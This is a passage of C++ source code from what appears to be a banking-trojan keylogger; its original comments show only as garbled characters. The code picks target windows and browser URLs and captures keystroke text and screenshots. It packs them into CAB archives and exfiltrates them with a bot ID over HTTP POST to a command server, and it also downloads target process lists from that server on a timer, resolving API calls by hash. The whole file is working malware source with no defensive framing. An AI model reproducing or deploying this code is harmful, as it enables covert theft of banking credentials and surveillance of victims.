    // ���������� ������ ��������� ��������
	ResetFiltersStatus(KLG.System);


	if (KLG.SystemCompleted &&  KLG.RemoveSystemAfterCompleted)
	{
		// ��� �������������
		List::Remove(Logger->Systems, KLG.System);
    }

	KLG.System = NULL;
	KLG.Filter = NULL;
	KLG.SystemCompleted = FALSE;

	return true;
}

//---------------------------------------------------------------------------


void KeyLogger::CloseSession()
{
	// ������������� ��������� ������� ���������
	CloseSystem(TRUE);
}

//---------------------------------------------------------------------------
bool KLGCompareText(PCHAR Mask, PCHAR Text, bool CaseSensetive)
{
	// �� �������������� ��������� ������ �������

	if (STR::IsEmpty(Text))
    	return false;

	if (CaseSensetive)
		return WildCmp(Text, Mask);

	PCHAR Tmp = STR::New(Text);
	STR::AnsiLowerCase(Tmp);

    bool Result = WildCmp(Tmp, Mask);

	STR::Free(Tmp);

	return Result;
}
//-----------------------------------------------------------------------------

bool DoKeyLoggerFiltrateText(HWND Wnd, bool CaseSensetive, PWndText Data,
	PCHAR &ClassName, PCHAR &WndText)
{
	// ��������� ����� ���� �� ����������� �������� �������� ����

   // �������� ������ ������� � ������� ��������
   if (!CaseSensetive && !Data->Lowered)
   {
		Data->Lowered = true;

		if (Data->ClassName != NULL)
			STR::AnsiLowerCase(Data->ClassName);

		if (Data->Caption != NULL)
			STR::AnsiLowerCase(Data->Caption);
   }


   	bool Valid = false;

	//------------ ��������� ����� ���� -----------------//
	if (!STR::IsEmpty(Data->ClassName))
	{
		if (ClassName == NULL)
		{
			// ���������� ����� ����
			ClassName = GetWndClassName(Wnd);
		}

		Valid = KLGCompareText(Data->ClassName, ClassName, CaseSensetive);
		if (!Valid) return false; 
	}


	//------------ ��������� ����� ���� -----------------//
	if (!STR::IsEmpty(Data->Caption))
	{
		if (WndText == NULL)
		{
			// ���������� ����� ����
			WndText = GetWndText(Wnd);
		}

		Valid = KLGCompareText(Data->Caption, WndText, CaseSensetive);
		if (!Valid) return false;
	}

    return true;
}
//-----------------------------------------------------------------------------

bool DoKeyLoggerFiltrate(HWND Wnd, DWORD Action,
	DWORD WndLevel, PKlgWndFilter Filter, PCHAR &ClassName, PCHAR &WndText)
{
	// ��������������� ����

	//------- ��������� �������������� ���� -------------//
	if (WndLevel > 0 && (Filter->Mode & FILTRATE_PARENT_WND) == 0)
		return false;

	//----------- ��������� ��� �������� ----------------//
	if (Action != 0 && (Filter->Actions & Action) == 0)
		return false;


    // ��������� �������� �����
	bool Result = DoKeyLoggerFiltrateText(Wnd, Filter->CaseSensetive, &Filter->Text, ClassName, WndText);

	if (!Result)
	{
		// ��������� �������������� �����
		if (Filter->AltText != NULL)
		{
			for (DWORD i = 0; i < List::Count(Filter->AltText); i++)
			{
				PWndText T = (PWndText)List::GetItem(Filter->AltText, i);
				Result = DoKeyLoggerFiltrateText(Wnd, Filter->CaseSensetive, T, ClassName, WndText);

				if (Result)
				{
					Result = true;
					break;
				}
			}
		}
	}

	// ��������� �������
	if (Result && Filter->OnFiltrate)
	{
		// ���������� ��������� ����������.
		// ������������� ���, ��� ����� �������
		Result = false;
        Filter->OnFiltrate(Filter, Wnd, NULL, Result);
	}

    return Result;
}


bool KeyLoggerDoFiltrateWnd(PKeyLogger Logger, HWND Wnd, DWORD Action, DWORD WndLevel,
				            PKeyLogSystem *System, PKlgWndFilter *Filter, HWND *ParentWND)
{
	// ������� ��������� ���� �� ���������� ������� ��������

	DWORD Count = List::Count(Logger->Systems);
	if (Count == 0)	return false;


	// ��������� ������� �����������
	if (KLG.MaxWndParentLevel == 0)
		KLG.MaxWndParentLevel = MAX_PARENTWND_LEVEL;
	if (WndLevel > KLG.MaxWndParentLevel)
		return false;


	bool Result = false;
	PCHAR WndClass = NULL;
	PCHAR WndText = NULL;
	bool Recursive = false; // ����� ��������� �� ������������� ����������� ����������


	// ��������� �� ������ �� ����� �� ����� �������
	PKeyLogSystem  SingleSystem = NULL;
	if (System != NULL && *System != NULL)
	{
		SingleSystem = *System;
		Count = 1;
	}

	// ��������� �����
    PKeyLogSystem Sys;
	// ���������� ��� �������
	for (DWORD i = 0; i < Count; i++)
	{
		if (SingleSystem)
			Sys = SingleSystem;
		else
			Sys = (PKeyLogSystem)List::GetItem(Logger->Systems, i);

		DWORD FiltersCount = List::Count(Sys->Filters);
		if (FiltersCount == 0)
			continue;


		// ���������� ��� ������� �������
		for (DWORD j = 0; j < FiltersCount; j++)
		{
			PKlgWndFilter Filt = (PKlgWndFilter)List::GetItem(Sys->Filters, j);

			// ��������� ��������������� ������
			if (Filt->PreFilter != NULL && !Filt->PreFilter->Activated)
            	continue;

			// ���������� ������

			if ((Filt->Mode & FILTRATE_PARENT_WND) == 0)
			{
				// ���� ���������� ����� �������� ������ ����, �� � ������
				// ����� �������� ������ �������� ���������� ������
				if (WndLevel > 0) continue;
			}
			else
				Recursive = true;

			// ��������� ������� ����������� �������� �������
			if (Filt->MaxParentLevel != 0 && WndLevel > Filt->MaxParentLevel)
				continue;

			Result = DoKeyLoggerFiltrate(Wnd, Action, WndLevel, Filt, WndClass, WndText);

			// � ������ ������ ��������� ����������
			if (Result)
			{
				if (System != NULL) *System = Sys;

				if (Filter != NULL) *Filter = Filt;

				if (ParentWND != NULL && Filt->IsDialog)
					*ParentWND = Wnd;

				break;
			}
		}

		if (Result)
			break;
	}

	STR::Free(WndClass);
	STR::Free(WndText);


	if (!Result && Recursive)
	{
		// ��������� ������������ ����
		Wnd = (HWND)pGetParent(Wnd);
		WndLevel++;
		Result = KeyLoggerDoFiltrateWnd(Logger, Wnd, Action, WndLevel, System, Filter, ParentWND);
    }

	return Result;
}
//----------------------------------------------------------------------------

bool KeyLogger::FiltrateWnd(HWND Wnd, DWORD Action, DWORD WndLevel,
				            PKeyLogSystem *System, PKlgWndFilter *Filter, HWND *ParentWND)
{
	// ������� ��������� ������������� ����������� �������� ���  ����
	if (Filter != NULL)
		*Filter = NULL;

	if (ParentWND != NULL)
		*ParentWND = NULL;

	PKeyLogger Logger = GetLogger(true);

	if (Wnd == NULL || Logger == NULL)
		return false;


	// ��������� �� ������ �� ����� �� ����� �������
	PKeyLogSystem  SingleSystem = NULL;
	if (System != NULL && *System != NULL)
	{
		SingleSystem = *System;
	}


	// ���� ������ - ��������� ������������������ �������
	bool Result = KeyLoggerDoFiltrateWnd(Logger, Wnd, Action, WndLevel, System, Filter, ParentWND);
	if (Result)
		return true;

	// � ������ ���� ������� ���������� ������� �� ����� ������������
	// ������� ��� ��������
	if (SingleSystem != NULL)
        return false;


    // ���� ������ - ��������� ������������� ���������� ���� ���� ��������
	DWORD Count = List::Count(Logger->Systems);


	PKeyLogSystem Sys;
	for (DWORD i = 0; i < Count; i++)
	{
		Sys = (PKeyLogSystem)List::GetItem(Logger->Systems, i);

		if (List::Count(Sys->Filters) == 0 && !Sys->NotAutoStart)
		{
			// � ������ ����� ��� ������� �� ������� �������
			// �� ����� ��������������� ��� ����
			if (Sys->ProcessNameHash == 0 || Sys->ProcessNameHash == Logger->ProcessNameHash)
			{
				if (System != NULL)
					*System = Sys;
				return true;
			}
		}
	}

	return false;
}
//----------------------------------------------------------------------------


bool KeyLogger::ConnectEventHandler(DWORD EventID, TKeyLoggerEventHandler Handler)
{
	// ���������� ���������� ������� ���������
	if (Handler == NULL)
		return false;

	PKeyLogger Logger = GetLogger(false);
	if (Logger == NULL)
		return false;

    // ��������� �� ������������� ������ �����������
	for (int i = List::Count(Logger->Events) - 1; i >= 0; i--)
	{
		PKLGEventHandlerItem Item = (PKLGEventHandlerItem)List::GetItem(Logger->Events, i);
		if (Item == NULL)
		{
			List::Delete(Logger->Events, i);
			continue;
        }

		if (Item->Handler == Handler && Item->EventID == EventID)
			return true;
	}

    // ��������� ����� ����������
	PKLGEventHandlerItem Item = CreateStruct(TKLGEventHandlerItem);
	if (Item == NULL)
		return false;

	Item->EventID = EventID;
    Item->Handler = Handler;

	List::Add(Logger->Events, Item);
	return true;
}

//----------------------------------------------------------------------------


void KeyLogger::DisconnectEventHandler(DWORD EventID, TKeyLoggerEventHandler Handler)
{
	// ��������� ���������� �������
	PKeyLogger Logger = GetLogger(false);
	if (Logger == NULL)
		return;


	for (int i = List::Count(Logger->Events) - 1; i >= 0; i--)
	{
		PKLGEventHandlerItem Item = (PKLGEventHandlerItem)List::GetItem(Logger->Events, i);
		if (Item == NULL)
		{
			List::Delete(Logger->Events, i);
			continue;
        }

		if (Item->Handler == Handler && (EventID == 0 || Item->EventID == EventID))
			List::Delete(Logger->Events, i);
	}
}
//----------------------------------------------------------------------------

bool KeyLogger::SendLoggerFile(PCHAR LogFileName, bool *InvalidFile)
{
	// ���������� ���� ������ � CAB �����
	// ��������� ����
	if (InvalidFile != NULL)
    	*InvalidFile = false;
	if (LogFileName == NULL) return false;

	KLGDBG("UnKLG", "���������� ����� ���������");



	// ��� ����� �������� ������ ��������� �������� ����� ����
    SetBankingMode();



	PKeyLogPacker Packer = KLGPacker::Initialize(LogFileName, false);
	if (Packer == NULL)
		return false;


	bool Result = KLGPacker::Pack(Packer);


	if (Result)
	{
		if (Packer->IsCabLog)
		{
			// ������ ������������ CAB �������

			CloseCab(Packer->CabHandle);
			Packer->CabHandle = NULL;


			Result = DataGrabber::SendCab(NULL, Packer->CabFileName, Packer->Application, InvalidFile);

		}
		else
		{
			// ���������� ��������� ���
			Result = SendTextLog(NULL, Packer->ProcessHash, Packer->PID,
								 Packer->Log, STR::Length(Packer->Log), InvalidFile);
		}
	}


	KLGPacker::Free(Packer);

	if (Result)
		KLGDBG("UnKLG", "����� ������� ���������");

	return Result;
}
//----------------------------------------------------------------------------

PCHAR KeyLogger::GetCurrentURL()
{
	//  ������� ���������� ����� �������� �������� � ������ ������ � ��������
	PKeyLogger L = GetLogger(true);
	if (L == NULL)
		return NULL;

	if (L->Process == PROCESS_IE)
		return KLG.CurrentURL;
	else
	if (L->Process == PROCESS_JAVA)
		return GetURLFromJavaProcess();

	return NULL;
}
//----------------------------------------------------------------------------

void KeyLogger::SetCurrentURL(PCHAR URL)
{
	// �������������� ����� ��������� ������
	PKeyLogger L = GetLogger(true);
	if (L == NULL)
		return;
	UpdateIEUrl(NULL, URL, false, false);
}


PCHAR KeyLoggerMakeCasheStr(DWORD AppHash)
{
	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _PrintA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );


	// �������������� ������
	PCHAR HashStr = STR::Alloc(15);
	_PrintA(HashStr, "0x%08X", (DWORD)AppHash);
	return HashStr;
}


bool KeyLogger::SendTextLog(PCHAR URL, DWORD AppHash, DWORD Pid, PCHAR Log,
							DWORD LogLen, bool* InvalidFile)
{
	// ������� ���������� ���� �� ������
	if (InvalidFile != NULL)
    	*InvalidFile = false;


	bool FreeURL = STR::IsEmpty(URL);

	if (FreeURL)
		URL = GetBotScriptURL(SCRIPT_KEYLOGGER);
	if (URL == NULL)
		return false;

	if (LogLen == 0)
		LogLen = StrCalcLength(Log);

	// �������������� ������
	PCHAR HashStr = KeyLoggerMakeCasheStr(AppHash);
	PCHAR PidStr  = StrLongToString(Pid);
	PCHAR ID      = GenerateBotID();
	PCHAR LogStr  = BASE64::Encode((LPBYTE)Log, LogLen);

	// ��������� ����
	PStrings Fields = Strings::Create();

	AddURLParam(Fields, FieldID, ID);
	AddURLParam(Fields, FieldType, "2");
	AddURLParam(Fields, FieldHash, HashStr);
	AddURLParam(Fields, FieldSHash, PidStr);
	AddURLParam(Fields, FieldLog, LogStr);

	// ���������� ������
	bool Result = false;

	THTTPResponseRec Response;
    ClearStruct(Response);

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();

		Result = CryptHTTP::Post(URL, Password, Fields, NULL, &Response, false);

		STR::Free(Password);
	#else
    	Result = HTTP::Post(URL, Fields, NULL, &Response);
	#endif

	if (Result)
		Result = CheckValidPostResult(&Response, NULL);

	if (!Result && Response.Code == 404 && InvalidFile != NULL)
	{
		*InvalidFile = false;
    }


	HTTPResponse::Clear(&Response);

	// ����������� ������
	if (FreeURL)
    	STR::Free(URL);
	STR::Free(HashStr);
	STR::Free(PidStr);
	STR::Free(ID);
	STR::Free(LogStr);
	Strings::Free(Fields);

	return Result;
}
//----------------------------------------------------------------------------

PCHAR KeyLoggerGetProcessListFileName()
{
	// ���� ����� ������ ���������
	char FileName[] = {'k', 'l', 'p', 'c', 'l', 's', 't', '.', 'd', 'a', 't',  0};
	return BOT::GetWorkPath(NULL, FileName);
}

//----------------------------------------------------------------------------
bool KeyLogger::DownloadProcessList(bool *NotSupportKeylogger)
{
	//  ������� ��������� ������ ���������, ��� ������� ����������
	//   ���������� �������� ������������

    if (NotSupportKeylogger != NULL)
       *NotSupportKeylogger = false;


	PCHAR URL = GetBotScriptURL(SCRIPT_KEYLOGGER);
	if (URL == NULL) return false;

	KLGDBG("UnKLG", "��������� ������ ��������� ���������");

	// �������������� ������
	PCHAR ID = GenerateBotID();

	// ��������� ����
	PStrings Fields = Strings::Create();

	AddURLParam(Fields, FieldID, ID);
	AddURLParam(Fields, FieldType, "1");

	// ���������� ������
	bool Result = false;

	THTTPResponseRec Response;
    ClearStruct(Response);

    PCHAR Buf = NULL;

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();

		Result = CryptHTTP::Post(URL, Password, Fields, &Buf, &Response, false);

		STR::Free(Password);
	#else
    	Result = HTTP::Post(URL, Fields, NULL, &Response);
	#endif

	if (Result)
		Result = Response.Code == 200;

	// ��������� ������� ��������� ��������� ��������
	if (NotSupportKeylogger != NULL && Response.Code == 404)
    	*NotSupportKeylogger = true;

	HTTPResponse::Clear(&Response);


	// ���������� ����� � ����
	if (Result)
	{
    	KLGDBG("UnKLG", "������ ��������� ������� ��������");
		DWORD  NewBufSize = sizeof(TKLGProcessListHeader) + STR::Length(Buf);
		LPBYTE NewBuf     = (LPBYTE)MemAlloc(NewBufSize);

		// �������������� ���������
		PKLGProcessListHeader H = (PKLGProcessListHeader)NewBuf;
		H->Signature = KLGProcListFileSignature;
		H->Version   = KLGProcListFileVersion;

		LPBYTE Tmp = NewBuf + sizeof(TKLGProcessListHeader);

		// �������� �����
		m_memcpy(Tmp, Buf, STR::Length(Buf));

		// ���������� ����
		PCHAR FileName = KeyLoggerGetProcessListFileName();

		File::WriteBufferA(FileName, NewBuf, NewBufSize);

		STR::Free(FileName);
	}


	// ����������� ������
	STR::Free(URL);
	STR::Free(ID);
	STR::Free(Buf);

	Strings::Free(Fields);

	return Result;
}

//---------------------------------------------------------------------

DWORD WINAPI KeyLoggerProcListDownloader(LPVOID Data)
{
	// ������� ��������� ������ ��������� ���������
;	const DWORD UpdateInterval = 12*60*60*1000;
	while (1)
	{
		DWORD Interval;
		bool NotSupport = false;
		if (KeyLogger::DownloadProcessList(&NotSupport))
			Interval = UpdateInterval;
		else
		{
        	// ���� �������� �� �������������� �� ��������� ��������
			if (NotSupport) return 0;

			Interval = 60000;
        }

		pSleep(Interval);
	}

    return 0;
}

//---------------------------------------------------------------------
void KeyLogger::StartProcessListDownloader()
{
	// ��������� ����� ��������� ������ ���������
	KLGDBG("UnKLG", "��������� ����� ���������� ������ ���������");
	StartThread(KeyLoggerProcListDownloader, NULL);

}
//---------------------------------------------------------------------

bool KeyLoggerSearchHashInStr(DWORD Hash, PCHAR Buf, DWORD BufSize)
{
	PCHAR HashStr = KeyLoggerMakeCasheStr(Hash);
	if (HashStr == NULL)
		return false;

	// � ������ ������ �������, ��� ������� ��������� � ������
	// ���� ����� ���������
	bool Result = STR::Pos(Buf, HashStr, BufSize) >= 0;

	STR::Free(HashStr);

	return Result;
}
//---------------------------------------------------------------------

bool KeyLogger::IsSupportProcess()
{
	//	������� ���������� ������ ���� ������� ���������� ����������

	PKeyLogger Logger = GetLogger(false);
	if (Logger == NULL)
    	return false;

	PCHAR FileName = KeyLoggerGetProcessListFileName();
	if (FileName == NULL)
		return false;

	// ��������� ����
	DWORD BufSize = 0;
	LPVOID Buf = File::ReadToBufferA(FileName, BufSize);

	bool Result = false;

	if (Buf != NULL && BufSize > sizeof(TKLGProcessListHeader))
	{
		// ��������� ���������
		PKLGProcessListHeader H = (PKLGProcessListHeader)Buf;
		if (H->Signature == KLGProcListFileSignature &&
			H->Version   == KLGProcListFileVersion)
		{
			// ��������� ���
			PCHAR Tmp = (PCHAR)Buf + sizeof(TKLGProcessListHeader);
            BufSize -= sizeof(TKLGProcessListHeader);

			Result = KeyLoggerSearchHashInStr(Logger->ProcessNameHash, Tmp, BufSize);
		}

		MemFree(Buf);
    }


	STR::Free(FileName);

	return Result;
}

// ��������� ����������� ����
void KeyLogger::DoShowWindow(PShowWindowData Data)
{
	// ������� ������� ������ ����
	CallEvent(KLE_SHOW_WND, Data);
}


bool inline __IsShowWndCommand(DWORD C)
{
	// ������� ���������� ������ ���� ������� Cmd ��������
	// �������� ����������� ����
	return C == SW_SHOWNORMAL ||
		   C == SW_SHOWMAXIMIZED ||
		   C == SW_SHOW;
}

void KeyLogger::DoAfterShowWindow(PShowWindowData Data)
{
	// ������� ����� ������� ������ ����
	PKeyLogger L = GetLogger(true);
	if (L != NULL && KLG.System == NULL && __IsShowWndCommand(Data->Command))
	{
		// ������������� �������� ����
		PCHAR  Txt = GetWndText(Data->Window);
		KeyLogger::SetActiveWnd(Data->Window, LOG_KEYBOARD);
		STR::Free(Txt);
	}

	CallEvent(KLE_AFTER_SHOW_WND, Data);
}






//****************************************************************************
//
//
// KLGPacker - ������ �������� ����� ��������� � ������ ��� ��������
//
//
//****************************************************************************


void KLGPackerFreeStrBlock(LPVOID Data)
{
	if (Data == NULL) return;
	PMemBlock Block = (PMemBlock)Data;
	STR::Free((PCHAR)Block->Data);
	FreeStruct(Block);
}
//-------------------------------------------------------------------------

bool KLGPackerDoInitialize(PKeyLogPacker Packer, PCHAR FileName)
{

	// ����� �������� ������������� ������

	// ��������� ����
	Packer->Handle = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (Packer->Handle == INVALID_HANDLE_VALUE)
		return false;

	// ������ ��������� �����
    TKLGFileHeader H;

	DWORD Readed = 0;
	pReadFile(Packer->Handle, &H, sizeof(H), &Readed, NULL);

	if (Readed < sizeof(H) || H.Signature != KLGFileSignature || H.Version != KLGFileVersion)
	{
        Packer->InvalidFile = true;
		return false;
    }

	// ��� ������������� ������ CAB �����

	if (!Packer->PackOnlyTextData)
	{
		Packer->IsCabLog = H.SendAsCAB;

		if (Packer->IsCabLog)
		{
			Packer->CabFileName = File::GetTempNameA();
			Packer->CabHandle = CreateCab(Packer->CabFileName);
			if (Packer->CabHandle == NULL)
				return false;
		}
    }


	// ����������� ���������
	Packer->ProcessHash  = H.AppHash;
	Packer->PID          = H.PID;
	Packer->TempFileName = File::GetTempNameA();
	Packer->TextBlocks   = List::Create();
	List::SetFreeItemMehod(Packer->TextBlocks, KLGPackerFreeStrBlock);


	return true;
}
//----------------------------------------------------------------------------

PKeyLogPacker KLGPacker::Initialize(PCHAR FileName, bool PackOnlyTextData)
{
	//	�������������� ���� � ��������
	if (STR::IsEmpty(FileName))
		return NULL;

	PKeyLogPacker Packer = CreateStruct(TKeyLogPacker);

	if (Packer != NULL)
	{
    	Packer->PackOnlyTextData =  PackOnlyTextData;
		if (!KLGPackerDoInitialize(Packer, FileName))
		{
			Free(Packer);
			Packer = NULL;
        }
    }
	return Packer;
}

//----------------------------------------------------------------------------


void KLGPacker::Free(PKeyLogPacker Packer)
{
	// ����������� ������ ������
	if (Packer == NULL)
		return;

	pCloseHandle(Packer->Handle);

	if (Packer->CabHandle != NULL)
		CloseCab(Packer->CabHandle);
	STR::Free(Packer->CabFileName);

	pDeleteFileA(Packer->TempFileName);
	STR::Free(Packer->TempFileName);

	STR::Free(Packer->Application);

	List::Free(Packer->TextBlocks);

	STR::Free(Packer->Log);


	FreeStruct(Packer);
}

//-------------------------------------------------------------------------

void KLGPackerPackTextBlocks(PKeyLogPacker Packer)
{
	// ��������� ��������� �����
	if (List::Count(Packer->TextBlocks) == 0)
		return;

	KLGDBG("KeyLogPacker", "������������ ��������� ������");

	// ������ ����
	PCHAR FileName = File::GetTempNameA();

	HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (File == INVALID_HANDLE_VALUE)
	{
		KLGDBG("KeyLogPacker", "������ �������� ��������� �����. ��� %d", pGetLastError());
		STR::Free(FileName);
		return;
	}

	DWORD Writed;
	PMemBlock Block;
	DWORD Wnd;
	//PCHAR Buf;
	DWORD i;
	bool First = true;
	// ���������� ����� � ���� �������� ������ �� ����
	while (List::Count(Packer->TextBlocks) > 0)
	{
		Block = (PMemBlock)List::GetItem(Packer->TextBlocks, 0);
		Wnd = Block->ID;

		if (Packer->TextLogWnd != NULL && Packer->TextLogWnd != (HWND)Wnd)
		{
        	List::Delete(Packer->TextBlocks, 0);
			continue;
        }

		// ���������� ����� ������
		if (!First)
			pWriteFile(File, "\r\n\r\n", 4, &Writed, NULL);
		First = false;

		// ���������� ������
		i = 0;
		while (i < List::Count(Packer->TextBlocks))
		{
			Block = (PMemBlock)List::GetItem(Packer->TextBlocks, i);
			if (Block->ID == Wnd)
			{
				pWriteFile(File, Block->Data, Block->Size, &Writed, NULL);
				List::Delete(Packer->TextBlocks, i);
			}
			else
				i++;
		}
	}

	pCloseHandle(File);

	// ��������� ���� � �����
	if (Packer->IsCabLog)
		AddFileToCab(Packer->CabHandle, FileName, "LogData.txt");
	else
	{
		// ������ ������ � �����
		DWORD Size = 0;
		LPBYTE Buf = File::ReadToBufferA(FileName, Size);

		Packer->Log = STR::New((PCHAR)Buf, Size);

		MemFree(Buf);
	}

	pDeleteFileA(FileName);


    KLGDBG("KeyLogPacker", "��������� ������: %s", Packer->Log);

	STR::Free(FileName);
}
//-------------------------------------------------------------------------

void KLGPackerDeleteText(PKeyLogPacker Packer, HWND Wnd)
{
	// ������� ��������� �����
	for (int i = List::Count(Packer->TextBlocks) - 1; i >= 0; i)
	{
		PMemBlock Block = (PMemBlock)List::GetItem(Packer->TextBlocks, i);
		if (Wnd == NULL || (HWND)Block->ID == Wnd)
			List::Delete(Packer->TextBlocks, i);
	}
}
//-------------------------------------------------------------------------

void KLGPackerAddTextData(PKeyLogPacker Packer, PLoggerBlockHead Head, LPVOID Data)
{
	// �������� ��������� ���� � ������
	PMemBlock Block = CreateStruct(TMemBlock);

	Block->ID   = Head->WND;
	Block->Size = Head->Size;
	Block->Data = STR::New((PCHAR)Data, Head->Size);

	List::Add(Packer->TextBlocks, Block);
}
//---------------------------------------------------------------------

void KLGPackerAddImage(PKeyLogPacker Packer, PLoggerBlockHead Head, LPVOID Data)
{
	// �������� �������� � �����

	PCHAR Index = StrLongToString((DWORD)Head->WND);
	PCHAR Name = STR::New(3, "ScreenShots\\", Index, ".png");

	// ��������� �������� � ������������� ����
	File::WriteBufferA(Packer->TempFileName, Data, Head->Size);

	// ��������� � �����
	AddFileToCab(Packer->CabHandle, Packer->TempFileName, Name);


	STR::Free(Index);
	STR::Free(Name);
}
//-------------------------------------------------------------------------


void KLGPackerSetApplicationName(PKeyLogPacker Packer, PCHAR Name, DWORD Size)
{
	// ���������� ��� ������� ���������
	if (Packer->Application != NULL)
		STR::Free2(Packer->Application);

	Packer->Application = STR::New(Name, Size);
}
//-------------------------------------------------------------------------

void DeleteTempFile(PKeyLogPacker Packer)
{
	if (!FileExistsA(Packer->TempFileName))
		return;
	// ���� ����� �������������� ��������� ����� �� ����� ����� ������
	// ��������� ������� �������
	for (int i = 0; i < 40; i++)
	{
		if (!pDeleteFileA(Packer->TempFileName))
			pSleep(50);
		else
			break;
	}
}
//-------------------------------------------------------------------------

void KLGPackerAddFile(PKeyLogPacker Packer, PLoggerBlockHead Head, PCHAR BlockName, LPVOID Data)
{
	// ��������� �� ��������� ����
	File::WriteBufferA(Packer->TempFileName, Data, Head->Size);

	// ��������� � �����
	AddFileToCab(Packer->CabHandle, Packer->TempFileName, BlockName);

	DeleteTempFile(Packer);

}
//-------------------------------------------------------------------------


bool KLGPacker::Pack(PKeyLogPacker Packer)
{
	// ��������� ������ ������

	// ������ ��� �����
	TLoggerBlockHead Head;
	DWORD HeadSize = sizeof(Head);
	DWORD Readed;
	LPBYTE Data;
	PCHAR BlockName = NULL;

	while (true)
	{
		// ������ ��������� �����
		pReadFile(Packer->Handle, &Head, HeadSize, &Readed, NULL);
		if (Readed < HeadSize) break;

		if (Head.NameSize != 0)
		{
			BlockName = STR::Alloc(Head.NameSize);
			pReadFile(Packer->Handle, BlockName, Head.NameSize, &Readed, NULL);
			if (Readed != Head.NameSize) break;
		}



		if (Head.Size == 0) continue;

		// ������ ������
		Data = (LPBYTE)MemAlloc(Head.Size + 1);
		if (Data == NULL) break;

		pReadFile(Packer->Handle, Data, Head.Size, &Readed, NULL);
		if (Readed != Head.Size)
		{
			MemFree(Data);
			break;
		}


		if (!Packer->PackOnlyTextData || Head.DataType == KEYLOGGER_DATA_TEXT)
		{
			// ������������ ������
			switch (Head.DataType) {
				// ��������� ������
				case KEYLOGGER_DATA_TEXT:        KLGPackerAddTextData(Packer, &Head, Data); break;
				case KEYLOGGER_DATA_APPLICATION: KLGPackerSetApplicationName(Packer, (PCHAR)Data, Head.Size); break;
				case KEYLOGGER_DATA_IMAGEPNG:    KLGPackerAddImage(Packer, &Head, Data); break;
				case KEYLOGGER_DATA_FILE:        KLGPackerAddFile(Packer, &Head, BlockName, Data); break;
                case KEYLOGGER_DELETE_TEXT_DATA: KLGPackerDeleteText(Packer, (HWND)Head.WND); break;
			}
        }

		MemFree(Data);
		STR::Free2(BlockName);
	}

	// ������������ ��������� �����
	KLGPackerPackTextBlocks(Packer);


	return true;
}
// ---------------------------------------------------------------------

PCHAR KLGPacker::GetTextDataFromFile(PCHAR FileName, HWND Wnd)
{
	// �������� ������ ��������� ������ �� �����
	PKeyLogPacker P = KLGPacker::Initialize(FileName, true);
	if (P == NULL)
		return NULL;

	P->TextLogWnd = Wnd;

    KLGPacker::Pack(P);

	PCHAR Result = P->Log;
	P->Log = NULL;


	KLGPacker::Free(P);

	return Result;
}

//----------------------------------------------------------------------------

